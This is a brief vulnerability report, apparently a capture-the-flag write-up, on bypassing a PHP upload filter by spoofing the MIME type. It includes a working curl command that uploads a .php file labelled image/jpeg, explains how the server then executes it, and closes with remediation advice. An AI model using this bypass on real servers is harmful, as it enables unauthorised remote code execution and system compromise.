# File Upload Vulnerability Report

## Vulnerability Summary
**Type:** Unrestricted File Upload via MIME Type Bypass  
**Target:** `http://{IP_ADDRESS}/index.php?page=upload`  

## Description
The file upload functionality only performed client-side validation (blocking `.php` uploads in the browser) but lacked proper server-side validation. The server trusted the `Content-Type` header from the request, allowing a malicious actor to bypass restrictions by spoofing the MIME type.

## Exploitation
### 1. Crafted cURL Request:
```bash
curl -F "Upload=send" -F "uploaded=@script.php;type=image/jpeg" http://{IP_ADDRESS}/index.php?page=upload
```
- **`Upload=send`**: Submits the upload form.
- **`uploaded=@script.php;type=image/jpeg`**: Spoofs the MIME type as `image/jpeg` while uploading a `.php` file.

### 2. Result:
The server accepted the file due to the spoofed `image/jpeg` MIME type, stored it with the `.php` extension, and executed it upon access, returning the flag.

## Impact
- Remote Code Execution (RCE) on the server.
- Full compromise of the web application and underlying system.

## Remediation
- Implement server-side file type validation (check extensions and magic numbers).
- Validate MIME types based on file content, not client-supplied headers.
- Store uploaded files in a directory without execution permissions.
- Rename uploaded files to prevent direct access.